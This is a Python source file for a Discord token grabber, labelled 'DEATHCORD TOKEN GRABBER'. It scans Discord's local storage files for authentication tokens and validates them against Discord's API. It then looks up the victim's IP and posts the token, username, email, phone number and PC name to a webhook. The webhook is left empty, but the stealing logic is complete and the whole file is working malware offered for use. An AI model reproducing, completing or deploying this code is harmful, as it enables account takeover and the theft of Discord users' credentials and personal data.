import os
import re
import json
import requests
import getpass

LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')
WEBHOOK = None


def check():
    paths = {
        'Discord': f'{ROAMING}\\discord\\Local Storage\\leveldb',
        # Add more paths here
    }
    for path in paths:
        try:
            base_tokens = find_tokens(paths[path])
            if len(base_tokens) > 0:
                user_info = get_discord(base_tokens)
                if len(base_tokens) > 0:
                    user_info[1]['type'] = path
                    return user_info
        except FileNotFoundError:
            continue
    return None


def find_tokens(path):
    base_tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.ldb') and not file_name.endswith('.log'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    base_tokens.append(token)
    return base_tokens


def get_discord(base_tokens):
    for token in base_tokens:
        data = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
        if data.status_code == 401:
            continue
        else:
            return token, json.loads(data.text)


def user_info():
    return json.loads(requests.get(f'http://ip-api.com/json/').text)


def send_webhook(webhook, data, info):
    if data is None:
        data = [
            'Unable to retrieve token',
            {
                'username': 'Cannot retrieve username',
                'discriminator': 'Cannot retrieve tag',
                'id': 'Cannot retrieve id',
                'bio': 'Cannot retrieve bio',
                'email': 'Cannot retrieve email',
                'phone': 'Cannot retrieve phone',
                'type': ''
            }
        ]
    token = data[0]
    user_info = data[1]
    message = f"""
@everyone

**DEATHCORD TOKEN GRABBER**
    -------------------------------------------------------------

PC Name: {getpass.getuser()}          
-
IP: {info['query']}
-
Username: {user_info['username']} #{user_info['discriminator']}
-
User ID: {user_info['id']}
-
Bio: {user_info['bio']}
-
Email: {user_info['email']}
-
Phone: {user_info['phone']}
-
Token: {token}
            
            
            Token Location: {user_info['type']}


    -------------------------------------------------------------
    """
    requests.post(webhook, json={'content': message})


discord_info = check()
info = user_info()
send_webhook(WEBHOOK, discord_info, info)
